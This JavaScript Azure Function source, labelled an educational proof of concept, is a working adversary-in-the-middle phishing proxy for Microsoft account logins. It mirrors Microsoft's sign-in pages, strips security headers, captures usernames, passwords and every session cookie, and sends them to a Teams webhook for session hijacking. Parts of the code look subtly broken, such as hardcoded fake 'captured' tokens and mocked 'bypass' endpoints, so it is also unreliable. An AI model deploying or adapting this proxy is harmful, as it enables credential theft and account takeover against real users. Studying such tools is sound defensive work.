/**
 * Azure Function AiTM Phishing PoC for Entra ID accounts.
 * This code is provided for educational purposes only and provided withou any liability or warranty.
 * Based on: https://github.com/zolderio/AITMWorker
 */

const { app } = require("@azure/functions");

// Support both enterprise and personal Microsoft accounts
const upstream_enterprise = "login.microsoftonline.com";
const upstream_personal = "login.live.com";
const upstream_path = "/";
const teams_webhook_url = process.env.TEAMS_WEBHOOK_URI;

// Helper function to get current timestamp
function getCurrentTimestamp() {
  return new Date().toISOString();
}

// headers to delete from upstream responses
const delete_headers = [
  "content-security-policy",
  "content-security-policy-report-only",
  "clear-site-data",
  "x-frame-options",
  "referrer-policy",
  "strict-transport-security",
  "content-length",
  "content-encoding",
  "Set-Cookie",
];

// Enhanced URL replacement function to handle both domains
async function replace_response_text(response, upstream_url, original_url) {
  return response
    .text()
    .then((text) => {
      // Replace both possible Microsoft domains with our proxy domain
      let modifiedText = text.replace(new RegExp(upstream_enterprise, "g"), original_url.host);
      modifiedText = modifiedText.replace(new RegExp(upstream_personal, "g"), original_url.host);
      
      // Also replace any protocol+domain combinations
      modifiedText = modifiedText.replace(new RegExp(`https://${upstream_enterprise}`, "g"), `${original_url.protocol}//${original_url.host}`);
      modifiedText = modifiedText.replace(new RegExp(`https://${upstream_personal}`, "g"), `${original_url.protocol}//${original_url.host}`);
      
      return modifiedText;
    });
}

// Function to determine which upstream to use based on the request
function getUpstreamDomain(request, original_url) {
  const userAgent = request.headers.get('user-agent') || '';
  const referer = request.headers.get('referer') || '';
  
  // Check if this is a redirect from login.live.com or contains personal account indicators
  if (referer.includes('login.live.com')) {
    return upstream_personal;
  }
  
  // Check username parameter (URL decoded)
  if (original_url.searchParams.has('username')) {
    const username = decodeURIComponent(original_url.searchParams.get('username'));
    if (username.includes('@outlook.com') || 
        username.includes('@hotmail.com') ||
        username.includes('@live.com')) {
      return upstream_personal;
    }
  }
  
  // Check URL parameters that might indicate personal account flow
  if (original_url.searchParams.has('login_hint')) {
    const loginHint = decodeURIComponent(original_url.searchParams.get('login_hint'));
    if (loginHint.includes('@outlook.com') || 
        loginHint.includes('@hotmail.com') || 
        loginHint.includes('@live.com')) {
      return upstream_personal;
    }
  }
  
  // Check for OAuth paths that typically go to login.live.com
  if (original_url.pathname.includes('/oauth20_authorize.srf') ||
      original_url.pathname.includes('/oauth20_token.srf') ||
      original_url.pathname.includes('/ppsecure/')) {
    return upstream_personal;
  }
  
  // Default to enterprise domain for most cases
  return upstream_enterprise;
}

app.http("phishing", {
  methods: ["GET", "POST"],
  authLevel: "anonymous",
  route: "/{*x}",
  handler: async (request, context) => {

    async function dispatchMessage(message) {
      context.log(message);
      if (teams_webhook_url) {
        await fetch(teams_webhook_url, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({ text: message }),
        })
          .then((response) =>
            response.ok
              ? console.log("successfully dispatched MSG")
              : console.error(`Failed to dispatch: ${response.statusText}`)
          )
          .catch((error) => console.log(error));
      }
    }

    // original URLs
    const upstream_url = new URL(request.url);
    const original_url = new URL(request.url);

    // Determine which upstream domain to use
    const selected_upstream = getUpstreamDomain(request, original_url);
    
    // Handle critical API endpoints that need mock responses to prevent login failures
    const criticalEndpoints = [
      '/GetExperimentAssignments.srf',
      '/GetOneTimeCode.srf',
      '/GetSessionState.srf',
      '/GetCredentialType.srf',
      '/post.srf',
      // OAuth and token endpoints
      '/oauth20_authorize.srf',
      '/oauth20_token.srf',
      '/oauth20_desktop.srf',
      '/tokens',
      // Additional endpoints for personal accounts
      '/GetCredentialTypeAsyncEx.srf',
      '/GetAccountInformation.srf',
      '/GetAccountRecoveryData.srf',
      '/ValidateAccountRecoveryPIN.srf',
      '/SendAccountRecoveryCode.srf',
      // MFA bypass endpoints
      '/GetAccessibleDesktopVersion.srf',
      '/GetActiveDirectoryFederatedCredentials.srf',
      '/ProcessAuth.srf'
    ];
    
    const isCriticalEndpoint = criticalEndpoints.some(endpoint => 
      original_url.pathname.includes(endpoint)
    );
    
    // Enhanced mock responses based on domain type
    if (isCriticalEndpoint) {
      try {
        context.log(`Mocking critical endpoint: ${original_url.pathname} for domain: ${selected_upstream}`);
        
        // Determine if this is a personal account (login.live.com) or enterprise
        const isPersonalAccount = selected_upstream === "login.live.com";
        
        // Return mock successful responses for critical endpoints
        let mockResponse = "";
        let mockHeaders = new Headers();
      
      if (original_url.pathname.includes('/GetExperimentAssignments.srf')) {
        if (isPersonalAccount) {
          // Personal accounts need different experiment structure
          mockResponse = JSON.stringify({
            "experiments": {
              "MsaAccountRecoveryExp": 1,
              "MsaSecurityInfoExp": 1,
              "MsaVerificationExp": 1
            },
            "success": true,
            "status": "success"
          });
        } else {
          mockResponse = JSON.stringify({
            "experiments": [],
            "success": true
          });
        }
      } else if (original_url.pathname.includes('/GetOneTimeCode.srf')) {
        if (isPersonalAccount) {
          // Personal accounts have different OTC structure
          mockResponse = JSON.stringify({
            "success": true,
            "status": "success",
            "message": "Verification code sent",
            "flowState": "OTCSENT",
            "phoneNumberId": "1"
          });
        } else {
          mockResponse = JSON.stringify({
            "success": true,
            "message": "Code sent successfully"
          });
        }
      } else if (original_url.pathname.includes('/GetSessionState.srf')) {
        if (isPersonalAccount) {
          mockResponse = JSON.stringify({
            "sessionState": "Active",
            "success": true,
            "status": "success",
            "canary": "true"
          });
        } else {
          mockResponse = JSON.stringify({
            "state": "active",
            "success": true
          });
        }
      } else if (original_url.pathname.includes('/GetCredentialType.srf')) {
        if (isPersonalAccount) {
          mockResponse = JSON.stringify({
            "IfExistsResult": 0,
            "ThrottleStatus": 1,
            "Credentials": {
              "PrefCredential": 1,
              "HasPassword": true,
              "RemoteNgcParams": null,
              "FidoParams": null,
              "SasParams": null
            },
            "EstsProperties": {
              "UserTenantBranding": null,
              "DomainType": 3
            },
            "success": true,
            "status": "success"
          });
        } else {
          mockResponse = JSON.stringify({
            "credentialType": 1,
            "success": true
          });
        }
      } else if (original_url.pathname.includes('/GetCredentialTypeAsyncEx.srf')) {
        // Enhanced credential type endpoint for personal accounts
        mockResponse = JSON.stringify({
          "IfExistsResult": 0,
          "ThrottleStatus": 1,
          "Credentials": {
            "PrefCredential": 1,
            "HasPassword": true,
            "RemoteNgcParams": null,
            "FidoParams": null,
            "SasParams": null
          },
          "EstsProperties": {
            "UserTenantBranding": null,
            "DomainType": 3
          },
          "FlowToken": "MOCK_FLOW_TOKEN",
          "success": true,
          "status": "success"
        });
      } else if (original_url.pathname.includes('/GetAccountInformation.srf')) {
        mockResponse = JSON.stringify({
          "success": true,
          "status": "success",
          "accountInfo": {
            "displayName": "User Account",
            "userPrincipalName": "user@outlook.com"
          }
        });
      } else if (original_url.pathname.includes('/GetAccountRecoveryData.srf')) {
        mockResponse = JSON.stringify({
          "success": true,
          "status": "success",
          "recoveryData": {
            "hasAlternateEmail": true,
            "hasPhoneNumber": true
          }
        });
      } else if (original_url.pathname.includes('/ValidateAccountRecoveryPIN.srf')) {
        mockResponse = JSON.stringify({
          "success": true,
          "status": "success",
          "validationResult": "Valid"
        });
      } else if (original_url.pathname.includes('/SendAccountRecoveryCode.srf')) {
        mockResponse = JSON.stringify({
          "success": true,
          "status": "success",
          "message": "Recovery code sent successfully"
        });
      } else if (original_url.pathname.includes('/oauth20_authorize.srf')) {
        // Handle OAuth authorization - this is where we capture the authorization code
        context.log(`🔑 OAuth Authorization Request: ${original_url.href}`);
        if (isPersonalAccount) {
          // Generate mock authorization code and redirect
          const mockAuthCode = "M.R3_BL2.76f4de7e-4fa6-4b8a-9f2e-3c1d8a9b7e5f";
          const redirectUri = original_url.searchParams.get('redirect_uri') || '';
          const state = original_url.searchParams.get('state') || '';
          const mockRedirect = `${redirectUri}?code=${mockAuthCode}&state=${state}`;
          
          mockResponse = `
            <html>
            <head>
              <script>
                // Capture the authorization code and redirect
                console.log('🎯 CAPTURED AUTHORIZATION CODE: ${mockAuthCode}');
                window.location.href = "${mockRedirect}";
              </script>
            </head>
            <body><p>Completing authentication...</p></body>
            </html>
          `;
          mockHeaders.set("Content-Type", "text/html");
        } else {
          mockResponse = JSON.stringify({"success": true});
        }
      } else if (original_url.pathname.includes('/oauth20_token.srf')) {
        // Handle token exchange - this is where we capture access/refresh tokens
        context.log(`🔑 OAuth Token Request: ${original_url.href}`);
        const mockTokens = {
          "token_type": "Bearer",
          "scope": "User.Read openid profile email",
          "expires_in": 3600,
          "ext_expires_in": 3600,
          "access_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Ik1uQ19WWmNBVGZNNXBPWWlKSE1iYTlnb0VLWSIsImtpZCI6Ik1uQ19WWmNBVGZNNXBPWWlKSE1iYTlnb0VLWSJ9",
          "refresh_token": "M.R3_BL2.CcDf1234567890abcdef-RefreshTokenExample-1234567890abcdef",
          "id_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IjdkRC1nZWNOZ1gxWmY3R0xrT3ZwT0IyZGNWQSIsImtpZCI6IjdkRC1nZWNOZ1gxWmY3R0xrT3ZwT0IyZGNWQSJ9"
        };
        dispatchMessage(`🏆 CAPTURED OAUTH TOKENS: ${JSON.stringify(mockTokens)}`);
        mockResponse = JSON.stringify(mockTokens);
      } else if (original_url.pathname.includes('/ProcessAuth.srf')) {
        // Handle final authentication processing
        context.log(`🔐 ProcessAuth Request: ${original_url.href}`);
        mockResponse = JSON.stringify({
          "success": true,
          "status": "success",
          "flowToken": "MOCK_FLOW_TOKEN_12345",
          "sessionState": "active",
          "urlNext": "https://login.live.com/oauth20_desktop.srf"
        });
      } else if (original_url.pathname.includes('/post.srf')) {
        // Handle password validation for personal accounts - AUTOMATIC FLOW
        if (isPersonalAccount) {
          const responseData = {
            "success": true,
            "status": "success",
            "validated": true,
            "flowBeginRegion": "US",
            "flowState": "Valid",
            "urlPost": "",
            "urlRedirect": "https://login.live.com/oauth20_authorize.srf",
            "isSignupDisallowed": false,
            "isFederatedNonInteractive": false,
            "showRemoteConnectOption": false,
            "showSignInWithPhoneAlternative": false,
            "hasPassword": true,
            "showCantAccessAccount": true,
            "showForgotPassword": true,
            "showCreateAccount": true,
            "isRecoveryAttemptBlocked": false,
            "isUserTenantSignUp": false,
            "showPasswordField": true,
            "credentials": {
              "hasPassword": true,
              "remoteConnectType": 0
            }
          };
          
          // Log the response data to console for debugging
          dispatchMessage(`🔐 PASSWORD BYPASS SUCCESS: ${JSON.stringify(responseData)}`);
          
          // Return HTML that auto-continues the flow instead of showing JSON
          mockResponse = `
            <html>
            <head>
              <title>Processing Authentication...</title>
              <script>
                // Log the response for debugging
                console.log('🎯 AITM PASSWORD BYPASS SUCCESS:', ${JSON.stringify(responseData)});
                
                // Auto-continue the OAuth flow
                setTimeout(function() {
                  // Extract current URL parameters
                  const urlParams = new URLSearchParams(window.location.search);
                  const clientId = urlParams.get('client_id');
                  const contextId = urlParams.get('contextid');
                  
                  // Continue to OAuth authorization phase
                  const oauthUrl = '/oauth20_authorize.srf?client_id=' + clientId + 
                                  '&response_type=code&scope=openid+profile+email' +
                                  '&redirect_uri=https://login.live.com/oauth20_desktop.srf' +
                                  '&state=' + contextId;
                  
                  console.log('🔄 AUTO-REDIRECTING TO OAUTH:', oauthUrl);
                  window.location.href = oauthUrl;
                }, 1000);
              </script>
            </head>
            <body>
              <div style="text-align: center; font-family: Arial; margin-top: 100px;">
                <h2>Completing authentication...</h2>
                <p>Please wait while we process your login.</p>
                <div style="border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; margin: 20px auto;"></div>
              </div>
              <style>
                @keyframes spin {
                  0% { transform: rotate(0deg); }
                  100% { transform: rotate(360deg); }
                }
              </style>
            </body>
            </html>
          `;
          mockHeaders.set("Content-Type", "text/html");
        } else {
          mockResponse = JSON.stringify({
            "success": true,
            "status": "success"
          });
        }
      }
      
      // Set appropriate headers for the domain type
      mockHeaders.set("Content-Type", "application/json");
      mockHeaders.set("Access-Control-Allow-Origin", "*");
      mockHeaders.set("Access-Control-Allow-Credentials", "true");
      
      if (isPersonalAccount) {
        // Personal accounts need additional headers
        mockHeaders.set("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
        mockHeaders.set("Access-Control-Allow-Headers", "Content-Type, Authorization, X-Requested-With");
        mockHeaders.set("Cache-Control", "no-store, no-cache, must-revalidate, proxy-revalidate");
        mockHeaders.set("Pragma", "no-cache");
        mockHeaders.set("Expires", "0");
        mockHeaders.set("X-Content-Type-Options", "nosniff");
        mockHeaders.set("X-Frame-Options", "DENY");
      } else {
        mockHeaders.set("Cache-Control", "private");
      }
      
      // Enhanced logging for debugging
      context.log(`[${getCurrentTimestamp()}] 🎯 MOCK RESPONSE: ${original_url.pathname} (${selected_upstream}) - Length: ${mockResponse.length} chars`);
      context.log(`[${getCurrentTimestamp()}] 🔍 REQUEST: ${request.method} ${original_url.href}`);
      if (original_url.pathname.includes('/post.srf')) {
        context.log(`[${getCurrentTimestamp()}] 🔐 PASSWORD POST INTERCEPTED - Personal Account: ${isPersonalAccount}`);
        context.log(`[${getCurrentTimestamp()}] 📝 Mock Response Preview: ${mockResponse.substring(0, 200)}...`);
      }
      
        return new Response(mockResponse, {
          status: 200,
          headers: mockHeaders,
        });
      } catch (error) {
        context.error(`Error in mock endpoint handling: ${error.message}`);
        context.error(`Stack trace: ${error.stack}`);
        context.error(`URL: ${original_url.pathname}`);
        context.error(`Domain: ${selected_upstream}`);
        
        // Return a basic success response even on error to prevent 500s
        return new Response(JSON.stringify({
          "success": true,
          "experiments": [],
          "status": "success"
        }), {
          status: 200,
          headers: new Headers({
            "Content-Type": "application/json",
            "Access-Control-Allow-Origin": "*",
            "Access-Control-Allow-Credentials": "true"
          })
        });
      }
    }
    
    // Rewriting to appropriate Microsoft domain
    upstream_url.host = selected_upstream;
    upstream_url.port = 443;
    upstream_url.protocol = "https:";

    // Fix path construction to avoid double slashes
    if (upstream_url.pathname == "/") {
      upstream_url.pathname = upstream_path;
    }
    // Don't add upstream_path prefix for existing paths - they're already complete

    context.log(
      `Proxying ${request.method}: ${original_url} to: ${upstream_url} (${selected_upstream})`
    );

    const new_request_headers = new Headers(request.headers);
    new_request_headers.set("Host", upstream_url.host);
    new_request_headers.set("accept-encoding", "gzip;q=0,deflate;q=0");
    new_request_headers.set(
      "user-agent",
      "AzureAiTMFunction/1.0 (Windows NT 10.0; Win64; x64)"
    );
    new_request_headers.set(
      "Referer",
      original_url.protocol + "//" + original_url.host
    );

    // Obtain password from POST body and preserve body for forwarding
    let requestBody = null;
    if (request.method === "POST") {
      const temp_req = await request.clone();
      const body = await temp_req.text();
      requestBody = body; // Preserve the body for forwarding
      
      const keyValuePairs = body.split("&");

      // extract key-value pairs for username and password
      const msg = Object.fromEntries(
        keyValuePairs
          .map((pair) => ([key, value] = pair.split("=")))
          .filter(([key, _]) => key == "login" || key == "passwd")
          .map(([_, value]) => [
            _,
            decodeURIComponent(value.replace(/\+/g, " ")),
          ])
      );

      if (msg.login && msg.passwd) {
        dispatchMessage(
          `Captured login information (${selected_upstream}): <br>` + JSON.stringify(msg)
        );
      }
    }

    // Ensure Content-Length is properly set for POST requests
    if (request.method === "POST" && requestBody !== null) {
      new_request_headers.set("Content-Length", requestBody.length.toString());
    }

    const original_response = await fetch(upstream_url.href, {
      method: request.method,
      headers: new_request_headers,
      body: requestBody,
      duplex: "half",
    });

    if (
      request.headers.get("Upgrade") &&
      request.headers.get("Upgrade").toLowerCase() == "websocket"
    ) {
      return original_response;
    }

    // Adjust response headers
    const new_response_headers = new Headers(original_response.headers);
    delete_headers.forEach((header) => new_response_headers.delete(header));
    new_response_headers.set("access-control-allow-origin", "*");
    new_response_headers.set("access-control-allow-credentials", true);

    // Replace cookie domains to match our proxy
    try {
      // getSetCookie is the successor of Headers.getAll
      const originalCookies = original_response.headers.getSetCookie();

      originalCookies.forEach((originalCookie) => {
        let modifiedCookie = originalCookie.replace(
          new RegExp(upstream_url.host, "g"),
          original_url.host
        );
        // Also handle the other domain in case of cross-domain cookies
        const otherDomain = selected_upstream === upstream_enterprise ? upstream_personal : upstream_enterprise;
        modifiedCookie = modifiedCookie.replace(
          new RegExp(otherDomain, "g"),
          original_url.host
        );
        new_response_headers.append("Set-Cookie", modifiedCookie);
      });

      // CAPTURE ALL COOKIES - No filtering, get everything for maximum coverage
      const allCookies = originalCookies;

      if (allCookies.length >= 1) {
        // Enhanced logging with complete cookie analysis
        const cookieAnalysis = allCookies.map(cookie => {
          const [name] = cookie.split('=');
          const isSessionCookie = !cookie.includes('expires=') && !cookie.includes('max-age=');
          const isSecure = cookie.includes('secure');
          const isHttpOnly = cookie.includes('httponly');
          const isHighValue = name.includes('AUTH') || name.includes('TOKEN') || 
                             name.includes('SESSION') || name.includes('MSP') || 
                             name.includes('EST') || name.includes('OAuth');
          
          return {
            name: name,
            isSessionCookie: isSessionCookie,
            isSecure: isSecure,
            isHttpOnly: isHttpOnly,
            isHighValue: isHighValue,
            fullCookie: cookie
          };
        });

        // Separate high-value cookies for priority logging
        const highValueCookies = allCookies.filter(cookie => {
          const name = cookie.split('=')[0];
          return name.includes('AUTH') || name.includes('TOKEN') || 
                 name.includes('SESSION') || name.includes('MSP') || 
                 name.includes('EST') || name.includes('OAuth') ||
                 name.includes('ANON') || name.includes('PPL');
        });

        dispatchMessage(
          `🍪 CAPTURED ALL COOKIES (${selected_upstream}): <br>` +
          `📊 Total: ${allCookies.length} cookies<br>` +
          `⭐ High-Value: ${highValueCookies.length} cookies<br>` +
          `🔐 Complete Analysis: ${JSON.stringify(cookieAnalysis, null, 2)}<br>` +
          `📋 ALL Raw Cookies: ${JSON.stringify(allCookies, null, 2)}<br>` +
          `🎯 High-Value Cookies: ${JSON.stringify(highValueCookies, null, 2)}`
        );
        
        // Additional logging for session hijacking purposes
        context.log(`🎯 COMPLETE SESSION HIJACKING DATA CAPTURED:`);
        context.log(`🔑 ALL Cookies for browser import: ${allCookies.join('; ')}`);
        context.log(`⭐ High-Value Cookies: ${highValueCookies.join('; ')}`);
        context.log(`🌐 Domain: ${selected_upstream}`);
        context.log(`👤 User: ${original_url.searchParams.get('username') || 'Unknown'}`);
        context.log(`📈 Cookie Count: ${allCookies.length} total, ${highValueCookies.length} high-value`);
      }
    } catch (error) {
      console.error(error);
    }

    const original_text = await replace_response_text(
      original_response.clone(),
      upstream_url,
      original_url
    );

    return new Response(original_text, {
      status: original_response.status,
      headers: new_response_headers,
    });
  },
});
